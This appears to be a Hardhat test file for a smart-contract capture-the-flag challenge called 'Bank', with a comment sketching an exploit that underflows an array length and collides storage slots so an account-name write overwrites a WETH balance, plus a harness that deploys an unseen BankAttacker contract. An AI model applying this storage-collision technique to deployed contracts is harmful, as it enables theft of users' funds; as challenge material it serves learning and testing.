const { expect } = require("chai");
const { ethers } = require("hardhat");


{/*
the main idea is too underflow accounts[msg.sender].length in
the setAccountName function. 
setAccountName is writing to the accounts[msg.sender][accountId].accountName slot
accountStructSlot := keccak(keccak(our_addr . 2)) + 3 * accountId
accounts[our_address][accountId].balances[WETH]
balanceSlot := keccak( WETH . [accountStructSlot + 2] )
balanceSlot := keccak( WETH . [keccak(keccak(our_addr . 2)) + 3 * accountId + 2] )
accountStructSlot(accountId) == balanceSlot
<=> keccak(keccak(our_addr . 2)) + 3 * accountId == balanceSlot
<=> accountId = [balanceSlot - keccak(keccak(our_addr . 2))] / 3
*/}

describe("[Challenge] Bank", function () {
  let deployer, attacker;

  const BANK_BALANCE = ethers.utils.parseEther('50');


  before(async function () {
    //SET UP SCENARIO   
    [deployer, attacker] = await ethers.getSigners();

    //in order to get the value to be sent use" ethers.utils.parseUnits('51', 'ether').toHexString()
    //and remove first 0 after the "x"
    await ethers.provider.send("hardhat_setBalance", [
        attacker.address, 
        "0x8ac7230489e80000" //sent 10 eth
    ])

    //expect attacker to have 10eth balance
    expect(await ethers.provider.getBalance(attacker.address)).to.eq(ethers.utils.parseEther("10", "ether"))

    //Deploy WETH contract
    this.weth = await (await ethers.getContractFactory("WETH9", deployer)).deploy()
    
    //deploy Bank contract 
    this.bank = await (await ethers.getContractFactory("Bank", deployer)).deploy()

    //transfer 50WETH to Bank contract
    // const deposit = this.weth.connect(depositer)
    await this.weth.deposit({value: BANK_BALANCE})
    await this.weth.approve(this.bank.address, BANK_BALANCE)
    await this.bank.depositToken(0, this.weth.address, BANK_BALANCE)

    //expect bank to have a 50weth balance
    expect(await this.weth.balanceOf(this.bank.address)).to.equal(BANK_BALANCE)



  });
  it("Exploit", async function() {
    const attackerFactory = await ethers.getContractFactory(`BankAttacker`, attacker);
    attacker = await attackerFactory.deploy(this.bank.address, this.weth.address);
    try {
        tx = await attacker.attack({ value: ethers.utils.parseEther(`0.001`) });
    } catch (error) {
        attacker = await attackerFactory.deploy(this.bank.address, this.weth.address);
        tx = await attacker.attack({ value: ethers.utils.parseEther(`0.001`) });
        await tx.wait();
    }
  })
});


// accounts[msg.sender][accountId].accountName == 